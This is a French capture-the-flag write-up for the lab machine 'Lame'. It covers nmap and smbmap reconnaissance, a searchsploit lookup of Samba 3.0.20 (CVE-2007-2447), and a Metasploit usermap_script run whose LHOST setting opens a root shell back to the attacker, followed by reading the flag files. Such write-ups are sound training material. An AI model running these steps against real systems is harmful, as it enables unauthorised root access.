<img src='assets/box.png' alt="Lame">

Informations de la Cible

    Nom : Lame

    Difficulté : Easy

    Outils : nmap, smbmap, searchsploit, msfconsole


1. Reconnaissance

La première étape consiste à identifier les services ouverts sur la machine cible via un scan Nmap.

```bash
nmap <ip>
```

Le scan révèle quatre ports ouverts : 21 (FTP), 22 (SSH), 139 et 445 (SMB). Pour affiner notre recherche, nous lançons un scan de version sur ces ports spécifiques :

```bash
nmap -sV -p 21,22,139,445 <ip>
```

Résultats clés :

- FTP : vsftpd 2.3.4 (version connue pour une backdoor historique).
- SMB : Samba 3.0.20-Debian (exposé via le port 445).


2. Énumération du service SMB

Le service FTP ne semble pas exploitable directement ici. Je me concentre donc sur le protocole SMB. J'utilise smbmap pour lister les partages accessibles sans authentification.

```bash
smbmap -H <ip>
```

Le partage /tmp est accessible en READ/WRITE. Plus important encore, le commentaire du partage IPC$ confirme la version précise du serveur : Samba 3.0.20-Debian.


3. Recherche d'exploit

Avec une version précise en main, j'utilise searchsploit pour vérifier l'existence de vulnérabilités connues.

```bash
searchsploit Samba 3.0.20
```

L'exploit "Username map script" (CVE-2007-2447) retient mon attention. Cette faille permet une exécution de code à distance (RCE) car Samba ne nettoie pas correctement les entrées dans le script de correspondance des utilisateurs.


4. Exploitation

J'ai décidé d'utiliser le framework Metasploit pour automatiser l'exploitation.

```bash
msfconsole
use exploit/multi/samba/usermap_script
set RHOSTS <ip>
set LHOST <VOTRE_IP_TUN0>
exploit
```

L'exploit s'exécute avec succès et ouvre une session de shell. Comme le service Samba tourne avec des privilèges élevés sur cette machine, j'obtiens directement un accès root.


5. Capture des Flags

Une fois le shell obtenu, je navigue dans le système pour récupérer les preuves de compromission.

User Flag (Makis) :

```bash
cat /home/makis/user.txt
```

Root Flag :

```bash
cat /root/root.txt
```
